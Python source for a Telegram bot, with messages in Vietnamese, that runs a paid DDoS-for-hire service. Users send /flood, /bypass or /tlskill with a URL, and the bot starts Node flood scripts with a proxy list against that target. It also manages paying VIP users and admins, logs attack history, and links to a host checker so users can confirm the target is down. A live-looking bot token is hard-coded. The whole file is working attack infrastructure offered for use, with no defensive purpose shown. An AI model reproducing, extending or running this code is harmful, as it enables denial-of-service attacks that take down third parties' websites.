import asyncio
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from urllib import parse
from datetime import datetime, timedelta
import json
import time
import pytz

ALLOWED_USER_ID = 6425144567
TOKEN = '7789002798:AAGklHsFNqilEyqIb_JlhKGALb-DPA9XUJg'
GROUPS_FILE, HISTORY_FILE, ADMINS_FILE = "allowed_groups.json", "attack_history.json", "admins.json"
task_info = {}
bot_status = True


VIP_FILE = "vipuser.json"

def load_vip_users():
    """Tải danh sách người dùng VIP từ file."""
    try:
        with open(VIP_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return [] 


def save_vip_users(vip_users):
    """Lưu danh sách người dùng VIP vào file."""
    with open(VIP_FILE, "w") as f:
        json.dump(vip_users, f)




def load_json(file, default_value=None):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return default_value if default_value else []

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f)


def is_admin(user_id):
    admins = load_json(ADMINS_FILE, [])
    return user_id == ALLOWED_USER_ID or user_id in admins


def is_bot_on():
    return bot_status



async def run_attack(url, attack_time, update, method, context):
    if not is_bot_on():
        return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện.")
    
    user_id = update.effective_user.id
    heap_size = "--max-old-space-size=32768"
    
 
    commands = {
        'bypass': f"node {heap_size} flood.js {url} {attack_time} 10 10 live.txt bypass",
        'flood': f"node {heap_size} flood.js {url} {attack_time} 32 16 live.txt flood",
        'tlskill': f"node {heap_size} tlskill.js {url} {attack_time} 64 16 live.txt" 
    }

    command = commands.get(method)
    if not command:
        return await update.message.reply_text("❌ Phương thức không hợp lệ.")

    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    task_info.setdefault(user_id, []).append({
        "url": url, "method": method, "remaining_time": attack_time,
        "task_id": process.pid, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S"),
        "message": None
    })



    history = load_json(HISTORY_FILE)
    history.append({"user_id": user_id, "username": update.effective_user.username, "url": url, "method": method, "attack_time": attack_time, "start_time": datetime.now(pytz.timezone("Asia/Ho_Chi_Minh")).strftime("%Y-%m-%d %H:%M:%S")})
    save_json(HISTORY_FILE, history)


    group_chat_id = update.message.chat.id
    attack_result = f"🚨 ATTACK {url} đã bắt đầu.\nPhương thức: {method}\nThời gian: {attack_time} giây\n\n💬 Người dùng @{update.effective_user.username} 💥 Kiểm tra tin nhắn đến từ bot để theo dõi kết quả chi tiết 📝."
    await context.bot.send_message(group_chat_id, attack_result)

    async def update_remaining_time():
        start_time = time.time()
        end_time = start_time + attack_time
        while time.time() < end_time:
            remaining_time = max(0, int(end_time - time.time()))
            task_text = f"🔴 Tiến trình:\nURL: {url}, Phương thức: {method}\n⏳ Thời gian còn lại: {remaining_time} giây\n\n🔗 Kiểm tra tình trạng HOST: [Click here](https://check-host.net/check-http?host=https://{parse.urlsplit(url).netloc})"


            if user_id in task_info and task_info[user_id]:

                if task_info[user_id][0]["message"]:
                    try:

                        await task_info[user_id][0]["message"].delete()
                    except Exception as e:
                        print(f"Error deleting message: {e}")  

                
                task_info[user_id][0]["message"] = await update.effective_user.send_message(task_text, parse_mode='Markdown')

            await asyncio.sleep(5)  

    
    asyncio.create_task(update_remaining_time())
    await asyncio.sleep(attack_time)

    
    await update.effective_user.send_message(f"Attack {method} URL {url} Successfully. ✅")


user_last_command_time = {}

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username 

    
    vip_users = load_vip_users()
    is_vip = username in vip_users

    if not is_bot_on():
        return await update.message.reply_text("❌ Bot hiện tại đang bị tắt, không thể thực hiện.")
    
    if update.message.chat.id not in load_json(GROUPS_FILE) and not is_admin(user_id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng tính năng này. Muốn build server bot riêng hoặc mở không giới hạn slot time, liên hệ [@tdun2710 👑]")

    if not is_admin(user_id):  
        current_time = time.time()  
        last_time = user_last_command_time.get(user_id, 0)  

        if current_time - last_time < 60:
            remaining_time = 60 - (current_time - last_time)
            return await update.message.reply_text(f"❌ @{update.effective_user.username}, bạn cần chờ thêm {int(remaining_time)} giây nữa mới có thể thực hiện lệnh tiếp theo.")

        user_last_command_time[user_id] = current_time
    
    if len(context.args) < 2:
        return await help_command(update, context)

    try:
        url, attack_time = context.args[0], int(context.args[1])

        
        if is_vip:
            max_attack_time = 300  
        else:
            max_attack_time = 60 

        if attack_time > max_attack_time and not is_admin(update.effective_user.id):
            return await update.message.reply_text(f"⚠️ Thời gian tối đa là {max_attack_time} giây. Bạn không thể tấn công quá {max_attack_time} giây.")

       
        if not is_vip and '/tlskill' not in update.message.text:
            return await update.message.reply_text("❌ Bạn không phải là người dùng VIP. Bạn chỉ có thể sử dụng lệnh /tlskill.")

        
        if '/tlskill' in update.message.text:
            method = 'tlskill'
        elif '/flood' in update.message.text:
            method = 'flood'
        elif '/bypass' in update.message.text:
            method = 'bypass'
        else:
            return await update.message.reply_text("❌ Phương thức tấn công không hợp lệ.")

        asyncio.create_task(run_attack(url, attack_time, update, method, context))

    except (IndexError, ValueError):
        await update.message.reply_text("❌ Đã xảy ra lỗi.")




async def vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        if len(context.args) < 1:
            return await update.message.reply_text("❌ Vui lòng cung cấp tên người dùng hợp lệ: /vip @username.")
        
        
        username = context.args[0].lstrip('@') 
        vip_users = load_vip_users()

        
        if username in vip_users:
            return await update.message.reply_text(f"❌ Người dùng @{username} đã có trong danh sách VIP.")

        
        vip_users.append(username)
        save_vip_users(vip_users)
        await update.message.reply_text(f"✅ Người dùng @{username} đã được thêm vào danh sách VIP.")
    
    except IndexError:
        await update.message.reply_text("❌ Vui lòng cung cấp tên người dùng hợp lệ.")



async def deletevip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        if len(context.args) < 1:
            return await update.message.reply_text("❌ Vui lòng cung cấp tên người dùng cần xóa: /deletevip @username.")
        
       
        username = context.args[0].lstrip('@')
        vip_users = load_vip_users()

        
        if username not in vip_users:
            return await update.message.reply_text(f"❌ Người dùng @{username} không có trong danh sách VIP.")

      
        vip_users.remove(username)
        save_vip_users(vip_users)

        await update.message.reply_text(f"✅ Người dùng @{username} đã bị xóa khỏi danh sách VIP.")
    
    except IndexError:
        await update.message.reply_text("❌ Vui lòng cung cấp tên người dùng hợp lệ.")






async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    history = load_json(HISTORY_FILE)
    current_time = datetime.now(pytz.timezone("Asia/Ho_Chi_Minh"))
    time_limit = current_time - timedelta(minutes=60)  

    
    filtered_history = [
        entry for entry in history 
        if datetime.strptime(entry['start_time'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=pytz.timezone("Asia/Ho_Chi_Minh")) >= time_limit
    ]
    
    if not filtered_history:
        return await update.message.reply_text("❌ Không có lịch sử tấn công trong 60 phút qua.")

    
    history_text = "📝 Lịch sử trong 60 phút qua:\n"
    for entry in filtered_history:
        history_text += f"💥 URL: {entry['url']}\n⚔ Phương thức: {entry['method']}\n👤 Người dùng: @{entry['username']}\n⏱ Thời gian: {entry['start_time']}\n⏳ Thời gian: {entry['attack_time']} giây\n\n"
    
   
    max_message_length = 4096
    while len(history_text) > max_message_length:
        
        await update.message.reply_text(history_text[:max_message_length], parse_mode='Markdown')
        history_text = history_text[max_message_length:]
    
    
    if history_text:
        await update.message.reply_text(history_text, parse_mode='Markdown')



async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    subprocess.run("ps aux | grep 'flood.js\\|tlskill.js' | grep -v grep | awk '{print $2}' | xargs kill -9", shell=True)
    await update.message.reply_text("✅ Tiến trình đã dừng.")


async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        group_id = int(context.args[0])
        allowed_groups = load_json(GROUPS_FILE)
        if group_id in allowed_groups:
            return await update.message.reply_text("❌ Nhóm này đã có trong danh sách.")
        
        allowed_groups.append(group_id)
        save_json(GROUPS_FILE, allowed_groups)
        await update.message.reply_text(f"✅ Nhóm {group_id} đã được thêm vào danh sách nhóm được phép.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID nhóm hợp lệ.")

async def add_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        new_admin_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if new_admin_id in admins:
            return await update.message.reply_text("❌ Người dùng này đã là admin.")
        
        admins.append(new_admin_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"✅ Người dùng {new_admin_id} đã được thêm vào danh sách admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID người dùng hợp lệ.")

async def delete_user_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    try:
        user_id = int(context.args[0])
        admins = load_json(ADMINS_FILE)
        
        if user_id not in admins:
            return await update.message.reply_text("❌ Người dùng này không phải là admin.")
        
        admins.remove(user_id)
        save_json(ADMINS_FILE, admins)
        await update.message.reply_text(f"✅ Người dùng {user_id} đã được xóa khỏi danh sách admin.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Vui lòng cung cấp ID người dùng hợp lệ.")

async def delete_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    save_json(HISTORY_FILE, [])
    await update.message.reply_text("✅ Toàn bộ lịch sử  đã được xóa.")

async def on(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    global bot_status
    bot_status = True
    await update.message.reply_text("✅ Bot đã được bật.")

async def off(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("❌ Bạn không có quyền sử dụng lệnh này.")
    
    global bot_status
    bot_status = False
    await update.message.reply_text("❌ Bot đã bị tắt.")




    

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🌐 LỆNH HƯỚNG DẪN:
Lệnh Người Dùng:
/flood https://google.com - Tấn công flood (người dùng mua VIP có thể sử dụng 300 giây).

/bypass https://google.com - Tấn công bypass (người dùng mua VIP có thể sử dụng 300 giây).

/tlskill https://google.com - Tấn công tlskill trong 60 giây [FREE].

/help - Hiển thị hướng dẫn lệnh.
Lệnh ADMIN 👑:
/vip @username - Thêm người dùng vào danh sách VIP (chỉ dành cho quản trị viên).
/deletevip @username - Xóa người dùng khỏi danh sách VIP (chỉ dành cho quản trị viên).
/stop - Dừng cuộc tấn công.
/addgroup [group_id] - Thêm nhóm.
/history - Xem lịch sử tấn công.
/adduser [user_id] - Thêm quản trị viên.
/deleteuser [user_id] - Xóa quản trị viên.
/deletehistory - Xóa lịch sử tấn công.
/on - Kích hoạt bot.
/off - Vô hiệu hóa bot.
[OWNERS @tdun2710]
MUA KEY VIP LIÊN HỆ @tdun2710 👑]
    """
    
    await update.message.reply_text(help_text, parse_mode='Markdown')




def main():
    application = ApplicationBuilder().token(TOKEN).build()
    
   
    application.add_handler(CommandHandler("flood", attack))
    application.add_handler(CommandHandler("bypass", attack))
    application.add_handler(CommandHandler("tlskill", attack))
    application.add_handler(CommandHandler("vip", vip))
    application.add_handler(CommandHandler("deletevip", deletevip))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("adduser", add_user_admin))
    application.add_handler(CommandHandler("deleteuser", delete_user_admin))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("history", history))
    application.add_handler(CommandHandler("deletehistory", delete_history))
    application.add_handler(CommandHandler("on", on))
    application.add_handler(CommandHandler("off", off))
    application.run_polling()

if __name__ == "__main__":
    main()

